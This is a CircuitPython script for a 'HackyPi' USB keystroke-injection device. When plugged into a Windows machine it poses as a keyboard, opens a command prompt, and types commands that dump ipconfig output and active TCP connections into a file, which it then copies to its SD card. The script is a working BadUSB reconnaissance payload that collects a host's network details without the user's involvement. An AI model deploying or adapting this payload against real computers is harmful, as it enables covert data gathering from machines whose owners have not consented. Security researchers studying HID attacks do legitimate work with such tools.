import os
import time
import board
import busio
import usb_hid
import digitalio
import displayio
import terminalio
from adafruit_display_text.label import Label
from adafruit_hid.keyboard import Keyboard, Keycode
from adafruit_st7789 import ST7789
from keyboard_layout_win_uk import KeyboardLayout
import storage
import adafruit_sdcard

SD_CS = board.GP17

# Connect to the card and mount the filesystem.
spi = busio.SPI(board.GP18, board.GP19, board.GP16)
cs = digitalio.DigitalInOut(board.GP17)
sdcard = adafruit_sdcard.SDCard(spi, cs)
vfs = storage.VfsFat(sdcard)
storage.mount(vfs, "/sd")

# Constants for the display
BORDER = 12
FONTSCALE = 3
BACKGROUND_COLOR = 0x000000  # Black
FOREGROUND_COLOR = 0x000000  # Black
TEXT_COLOR = 0xFFFFFF  # White for text color

# Release any resources currently in use for the displays
displayio.release_displays()

# SPI configuration for TFT
tft_clk = board.GP10  # SPI CLK
tft_mosi = board.GP11  # SPI TX
tft_rst = board.GP12
tft_dc = board.GP8
tft_cs = board.GP9
spi_display = busio.SPI(clock=tft_clk, MOSI=tft_mosi)

# Initialize the display
display_bus = displayio.FourWire(spi_display, command=tft_dc, chip_select=tft_cs, reset=tft_rst)
display = ST7789(display_bus, rotation=270, width=240, height=135, rowstart=40, colstart=53)
splash = displayio.Group()
display.show(splash)

# Background color
color_bitmap = displayio.Bitmap(display.width, display.height, 1)
color_palette = displayio.Palette(1)
color_palette[0] = BACKGROUND_COLOR

# Backlight control
tft_bl = board.GP13  # GPIO pin to control backlight LED
led = digitalio.DigitalInOut(tft_bl)
led.direction = digitalio.Direction.OUTPUT
led.value = True

bg_sprite = displayio.TileGrid(color_bitmap, pixel_shader=color_palette, x=0, y=0)
splash.append(bg_sprite)

# Function to draw an inner rectangle
def inner_rectangle():
    inner_bitmap = displayio.Bitmap(display.width - BORDER * 2, display.height - BORDER * 2, 1)
    inner_palette = displayio.Palette(1)
    inner_palette[0] = FOREGROUND_COLOR
    inner_sprite = displayio.TileGrid(inner_bitmap, pixel_shader=inner_palette, x=BORDER, y=BORDER)
    splash.append(inner_sprite)

# Function to print text on TFT
def print_onTFT(text, x_pos, y_pos):
    text_area = Label(terminalio.FONT, text=text, color=TEXT_COLOR)
    text_group = displayio.Group(scale=FONTSCALE, x=x_pos, y=y_pos)
    text_group.append(text_area)
    splash.append(text_group)

# Function to simulate typing and pressing Enter
def type_and_enter(command, keyboard_layout, delay=0.1):
    keyboard_layout.write(command)
    keyboard.send(Keycode.ENTER)
    time.sleep(delay)

# Function to save file in the current directory
def save_file_in_current_directory(file_name, command, keyboard_layout):
    file_path = file_name
    keyboard_layout.write(f"{command} > \"{file_path}\"")
    keyboard.send(Keycode.ENTER)
    time.sleep(1)

# Initial screen setup
inner_rectangle()
print_onTFT("Welcome to", 30, 40)
print_onTFT("HackyPi", 60, 80)
time.sleep(3)

try:
    keyboard = Keyboard(usb_hid.devices)
    keyboard_layout = KeyboardLayout(keyboard)
    time.sleep(1)

    keyboard.send(Keycode.WINDOWS, Keycode.R)
    time.sleep(0.3)

    keyboard_layout.write('cmd.exe')
    keyboard.send(Keycode.ENTER)
    time.sleep(0.5)

    # Get all SSID and change to HackyPi drive letter
    keyboard_layout.write('FOR /F "tokens=* USEBACKQ" %F IN (`powershell -Command "(Get-WmiObject Win32_LogicalDisk | Where-Object {$_.DriveType -eq 2}).DeviceID"`) DO (CD /D %F)')
    keyboard.send(Keycode.ENTER)
    time.sleep(0.5)

    # Command to create combined file
    # First write ipconfig output
    keyboard_layout.write("ipconfig > netinfo.txt")
    keyboard.send(Keycode.ENTER)
    time.sleep(1)

    # Then append netstat output
    keyboard_layout.write("netstat -n -p tcp | findstr /C:\"ESTABLISHED\" /C:\"CLOSE_WAIT\" >> netinfo.txt")
    keyboard.send(Keycode.ENTER)
    time.sleep(4)  # wait for the timeout and netstat to finish

    inner_rectangle()
    print_onTFT("Files", 70, 40)
    print_onTFT("Created", 50, 80)
    time.sleep(3)

    # Copy file to sd card
    src = "netinfo.txt"
    dst = f"/sd/netinfo.txt"
    with open(src, "rb") as src_file:
        with open(dst, "wb") as dst_file:
            dst_file.write(src_file.read())

except Exception as ex:
    keyboard.release_all()
    raise ex

inner_rectangle()
print_onTFT("Execution", 30, 40)
print_onTFT("Complete", 40, 80)
time.sleep(3)
